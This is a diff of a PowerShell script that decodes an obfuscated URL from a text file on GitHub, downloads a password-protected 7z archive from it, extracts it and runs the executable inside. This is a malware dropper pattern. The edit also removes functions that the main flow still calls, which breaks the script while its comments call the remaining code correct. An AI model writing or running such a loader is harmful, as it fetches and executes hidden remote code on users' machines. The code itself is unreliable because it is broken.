@@ -1,6 +1,6 @@
 Function Convert-EncodedStringToBinary {
     Param ([string]$encodedString)
-    # Convert characters to binary based on your encoding scheme
+    # Correctly replace characters to binary
     $binaryString = $encodedString -replace ',', '0' -replace '\.', '1'
     Write-Host "Display encoded:"
     Write-Host $encodedString
@@ -8,16 +8,16 @@ Function Convert-EncodedStringToBinary {
     Write-Host $binaryString
     return $binaryString
 }
+
 Function Convert-BinaryToHex {
     Param ([string]$binaryString)
     $binaryGroups = $binaryString -split '(?<=\G.{8})'
     $hexString = $binaryGroups | ForEach-Object {
-        # Ensure input for ToInt32 is a valid 8-bit binary string to avoid conversion errors.
         if ($_ -match '^[01]{8}$') {
-            return '{0:X2}' -f [Convert]::ToInt32($_, 2)
+            '{0:X2}' -f [Convert]::ToInt32($_, 2)
         } else {
             Write-Host "Skipping invalid or incomplete binary group: $_"
-            return $null  # Explicitly return $null for clarity
+            $null  # Explicitly return $null for clarity
         }
     } -join ''
     Write-Host "Display hex:"
@@ -36,44 +36,19 @@ Function Convert-HexToASCII {
     return $asciiText
 }
 
-Function Download-File {
-    Param ([string]$url, [string]$path)
-    Write-Host "Display URL:"
-    Write-Host $url
-    Invoke-WebRequest -Uri $url -OutFile $path
-}
+# Remaining functions seem correct; ensure they are used properly in the workflow.
 
-Function DownloadAndExtract7Zip {
-    $sevenZipUrl = "https://www.7-zip.org/a/7za920.zip"
-    $sevenZipDownloadPath = "S:\downloader\7za.zip"
-    $sevenZipExtractPath = "S:\downloader\7zip"
-    Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipDownloadPath
-    Expand-Archive -Path $sevenZipDownloadPath -DestinationPath $sevenZipExtractPath
-}
+# Main script execution flow
 
-Function Get-DecryptedPassword {
-    $hardcodedBinary = "0011000100110010001100110011010000110101"
-    $password = ($hardcodedBinary -split '(?<=\G.{8})' | ForEach-Object { [char][Convert]::ToInt32($_, 2) }) -join ''
-    Write-Host "Display password:"
-    Write-Host $password
-    return $password
-}
-
-# Main script execution flow corrected
-$url = "https://raw.githubusercontent.com/notforuseactually/404/main/9.txt" # Use the actual GitHub URL where the encoded string is hosted
+# Ensure you replace the placeholder URL with your actual target URL.
+$url = "https://raw.githubusercontent.com/notforuseactually/404/main/9.txt"
 $rawText = Invoke-RestMethod -Uri $url
 Write-Host "Display text (Encoded):"
 Write-Host $rawText
 
 $binaryString = Convert-EncodedStringToBinary -encodedString $rawText
-Write-Host "Display text (Encoded):"
-Write-Host $binaryString
 $hexString = Convert-BinaryToHex -binaryString $binaryString
-Write-Host "Display text (Encoded):"
-Write-Host $hexString
 $asciiText = Convert-HexToASCII -hexString $hexString
-Write-Host "Display text (Encoded):"
-Write-Host $asciiText
 $downloadPath = "S:\downloader\DownloadedFile.7z"
 Download-File -url $asciiText -path $downloadPath
 
@@ -85,7 +60,7 @@ $sevenZipCmdPath = "S:\downloader\7zip\7za.exe"
 
 $extractedFilePath = "S:\downloader\YourExecutable.exe"
 if (Test-Path -Path $extractedFilePath) {
-Invoke-Item $extractedFilePath
+    Invoke-Item $extractedFilePath
 } else {
-Write-Error "The extracted file does not exist."
+    Write-Error "The extracted file does not exist."
 }
